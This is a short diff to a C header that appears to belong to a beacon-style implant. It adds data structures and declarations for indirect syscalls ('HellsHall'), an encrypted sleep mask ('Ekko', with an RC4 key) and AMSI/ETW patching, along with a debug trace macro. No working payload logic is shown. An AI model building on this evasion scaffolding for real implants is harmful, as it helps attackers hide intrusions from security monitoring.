@@ -8,6 +8,18 @@
 #include "beacon_gate.h"
 #include "evasion/beacon_gate_impl.h"
 #include "obfstr.h"
+
+// NT_SYSCALL type definition for INSTANCE struct (also guarded in hellshall.h)
+#ifdef INCLUDE_EVASION_HELLSHALL
+#ifndef _NT_SYSCALL_DEFINED
+#define _NT_SYSCALL_DEFINED
+typedef struct _NT_SYSCALL {
+    DWORD   dwSSn;
+    PVOID   pSyscallAddress;
+    PVOID   pSyscallInstAddress;
+} NT_SYSCALL, *PNT_SYSCALL;
+#endif
+#endif
 #include "stackstr.h"
 
 #define DLL_BEACON_START     0x04
@@ -396,6 +408,18 @@ typedef struct _INSTANCE {
     // Exit function: 0 = ExitThread (default), 1 = ExitProcess
     DWORD  ExitFunc;
 
+#ifdef INCLUDE_EVASION_HELLSHALL
+    // ─── HellsHall indirect syscalls ───
+    NT_SYSCALL HH_Syscalls[16];           // Resolved syscall descriptors (HH_MAX_SYSCALLS)
+    BOOL   bHellsHallInit;                // TRUE if all syscalls resolved successfully
+#endif
+
+#if SLEEP_MASK_TYPE == MASK_EKKO
+    // ─── Ekko sleep state ───
+    BYTE   EkkoKey[16];                   // RC4 key for SystemFunction032
+    BOOL   bEkkoInitialized;              // TRUE after first Ekko call
+#endif
+
 } INSTANCE, *PINSTANCE;
 
 // Global instance (resolved via PIC pattern)
@@ -427,6 +451,9 @@ VOID patch_amsi(PINSTANCE inst);
 #ifdef INCLUDE_EVASION_ETW
 VOID patch_etw(PINSTANCE inst);
 #endif
+#ifdef INCLUDE_EVASION_HELLSHALL
+BOOL hellshall_init(PINSTANCE inst);
+#endif
 
 // Config parsing
 VOID parse_config(PINSTANCE inst, const BYTE* buf, DWORD len);
@@ -440,6 +467,15 @@ VOID  es_memset(PVOID dst, int val, SIZE_T len);
 int   es_strcmp(const char* a, const char* b);
 int   es_strlen(const char* s);
 VOID  es_strcpy(char* dst, const char* src);
+
+#ifdef DEBUG
+// TEMP DIAGNOSTIC: file-based stage tracing (OutputDebugString is not capturable
+// over this test harness). Defined in main.cc.
+VOID es_dbg_trace(PINSTANCE inst, const char* msg);
+#define TRACE(inst, m) es_dbg_trace(inst, m)
+#else
+#define TRACE(inst, m) ((void)0)
+#endif
 
 #ifdef DEBUG
 #define DBG(inst, tag) do { if ((inst)->Win32.OutputDebugStringA) { (inst)->Win32.OutputDebugStringA(tag); (inst)->Win32.OutputDebugStringA("\n"); } } while(0)
